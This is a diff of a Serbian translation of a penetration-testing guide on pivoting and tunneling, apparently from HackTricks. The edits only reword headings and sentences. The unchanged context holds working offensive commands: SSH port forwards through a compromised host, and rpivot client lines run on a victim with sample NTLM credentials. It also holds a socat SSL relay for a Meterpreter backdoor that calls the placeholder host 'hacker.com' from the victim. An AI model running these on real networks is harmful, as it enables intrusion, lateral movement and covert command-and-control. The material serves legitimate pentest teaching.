@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Lokalni port --> Kompromitovani host (SSH) --> Treća_boks:Port
+Lokalni port --> Kompromitovani host (SSH) --> Treća_kutija:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezbednost – Terrapin napad (CVE-2023-48795)**
-> Napad na downgrade Terrapin iz 2023. može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
+> Napad na downgrade Terrapin iz 2023. godine može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
 
 ## SSHUTTLE
 
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Veza i Slušanje
+### Povezivanje agenta i slušanje
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotiranje kroz **NTLM proxy**
+Pivot kroz **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter preko SSL Socat
+### Meterpreter kroz SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
+Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -347,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Potrebno je imati **RDP pristup preko sistema**.\
+Morate imati **RDP pristup preko sistema**.\
 Preuzmite:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u Windows-u. DVC je odgovoran za **tunelovanje paketa preko RDP veze**.
@@ -379,7 +379,7 @@ U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksi
 ## NTLM proksi zaobilaženje
 
 Prethodno pomenuti alat: **Rpivot**\
-**OpenVPN** takođe može da ga zaobiđe, postavljanjem ovih opcija u konfiguracionom fajlu:
+**OpenVPN** takođe može da ga zaobiđe, postavljajući ove opcije u konfiguracionom fajlu:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru kroz ovaj port.\
+Ova alatka se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena DNS u proxychains
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **definiciji**, **DNS** server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
-_URI za izlaganje su kao:_ **UID.ngrok.io**
+_Exposition URI su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
@@ -549,7 +549,7 @@ addr: file:///tmp/httpbin/
 
 Cloudflare-ov `cloudflared` daemon može da kreira izlazne tunele koji izlažu **lokalne TCP/UDP usluge** bez potrebe za ulaznim pravilima vatrozida, koristeći Cloudflare-ovu ivicu kao mesto susreta. Ovo je veoma korisno kada izlazni vatrozid dozvoljava samo HTTPS saobraćaj, dok su ulazne konekcije blokirane.
 
-### Quick tunnel one-liner
+### Brza komanda za tunel
 ```bash
 # Expose a local web service listening on 8080
 cloudflared tunnel --url http://localhost:8080
